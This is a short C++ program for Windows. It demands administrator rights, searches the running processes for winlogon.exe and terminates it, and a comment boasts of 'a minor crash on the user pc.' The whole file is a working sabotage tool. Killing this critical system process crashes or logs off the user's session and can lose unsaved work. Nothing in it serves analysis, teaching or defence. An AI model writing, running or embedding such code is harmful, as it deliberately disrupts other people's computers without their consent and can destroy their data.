#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <shlobj_core.h>

bool listProcess()
{
    if (!IsUserAnAdmin())
    {
        std::cout << "Run the program in admin mode!\n";
        return 0;
    }

    int exeId = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
        if (Process32First(snapshot, &pe32))
        {
            do
            {
                if (strcmp(pe32.szExeFile, "winlogon.exe") == 0) 
                {
                    exeId = pe32.th32ProcessID;
                 
                   HANDLE process = OpenProcess(PROCESS_TERMINATE, false, exeId);
                   TerminateProcess(process, 1);
                   CloseHandle(process);
                   return 1; //succesfully did a minor crash on the user pc.
                }

            } while (Process32Next(snapshot, &pe32));
        }
        CloseHandle(snapshot);
    }
   
    return 1;
}


int main()
{
    listProcess();
    getchar();
}
